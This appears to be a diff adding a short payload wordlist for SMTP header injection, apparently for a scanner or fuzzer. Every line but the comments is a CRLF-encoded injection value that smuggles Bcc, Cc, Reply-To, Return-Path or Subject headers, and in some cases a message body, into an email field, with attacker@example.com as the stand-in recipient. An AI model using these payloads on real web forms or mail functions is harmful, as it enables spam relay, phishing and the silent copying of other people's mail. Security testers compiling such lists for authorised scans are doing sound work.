@@ -1,0 +1,14 @@
+# Basic SMTP header injection via CRLF in email-like fields
+victim@example.com%0d%0aBcc: attacker@example.com
+victim@example.com%0d%0aCc: attacker@example.com
+victim@example.com%0d%0aReply-To: attacker@example.com
+victim@example.com%0d%0aReturn-Path: attacker@example.com
+
+# Multiple injected headers
+victim@example.com%0d%0aBcc: attacker@example.com%0d%0aReply-To: attacker@example.com
+victim@example.com%0d%0aCc: attacker@example.com%0d%0aX-Mailer: injected-scanner
+
+# With body split (if mail() or MTA парсит CRLFCRLF)
+victim@example.com%0d%0aSubject: injected subject%0d%0a%0d%0aINJECTED_SMTP_BODY
+victim@example.com%0d%0aBcc: attacker@example.com%0d%0a%0d%0aThis is injected content.
+
